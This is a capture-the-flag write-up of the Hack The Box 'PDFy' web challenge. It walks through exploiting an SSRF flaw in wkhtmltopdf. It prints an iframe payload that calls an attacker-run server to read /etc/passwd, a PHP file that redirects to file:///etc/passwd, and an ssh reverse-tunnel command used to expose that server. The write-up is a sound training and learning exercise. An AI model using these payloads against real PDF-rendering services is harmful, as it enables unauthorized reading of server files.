# TL;DR

1. Saw that input was reaching out to a website and tried to input "localhost", which produced an error
2. Saw the error came from using the wkhtmltopdf application and looked up vulns for it
3. Found a vuln and a POC for it and tried to get a PDF
4. Did not get a PDF and after a few attempts tried to use a command to get a temp domain name for the server to reach out to with a different payload
5. After giving the temp domain in the form I got a PDF back with the flag

# Detailed Writeup

When first getting to the site we this homepage:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/WebChallenges/PDFy/homepage.png)

The site creates PDFs of sites that is given in the form. I tried to spin up a python server and tried to see if the site would reach back. But the site just hanged without any hits from the server

So I tried to put in "http://localhost" and when I did I got this error from the server:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/WebChallenges/PDFy/error.png)

wkhtmltopdf, this is interesting as the server says a command failed when it tried to use this application. After this, I did a quick google search for any wkhtmltopdf vulnerabilities and I happen to land on page explaining that wkhtmltopdf has a known SSRF vulnerability. 

After this, I tried to look to see if there were any POC's and I happen to land on exploit-notes.hdks.org which had section dedicated to testing for this vulnerability in wkhtmltopdf:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/WebChallenges/PDFy/explanation.png)

I followed these steps. Creating the malicious php file, starting the php server, and tried to inject the payload into the form:

**Example Payload**
```
<iframe src=http://<Your IP address here>:<Port of server>/test.php?x=/etc/passwd width=1000px height=1000px></iframe>
```

I tried to just injecting and it got an error message but did get a hit on my server:

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/WebChallenges/PDFy/payload.png)
![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/WebChallenges/PDFy/server.png)

I thought maybe there was something wrong with the php file that I made as I was getting hits on my server. I tried changing the payload to a more simple version than the one in the website that did not take command arguments:

```
<?php
  header("Location: file:///etc/passwd");
?>
```

I got something different but not a PDF so I thought maybe I need to have a domain name since it google.com and github.com. So I used this command to set up a temporary domain: 

```
ssh -R 80:localhost:8000 nokey@localhost.run
```

I sent the payload again with new domain name copied from the above command and once again I did not get a PDF.

**Payload Used**
```
<iframe src=http://<Temp domain name>:8000/test2.php width=1000px height=1000px></iframe>
```

So I tried to just give just the full url of the temp domain name and I got a PDF with the flag: 

![alt text](https://github.com/GabeALopez/CTF-Writeups/blob/main/Images/HTB/WebChallenges/PDFy/flag.png)

I come to later find out from other experiments that the site was blocking input and found that input that was given had to start with "http://" or "https://" or else input would of been blocked.
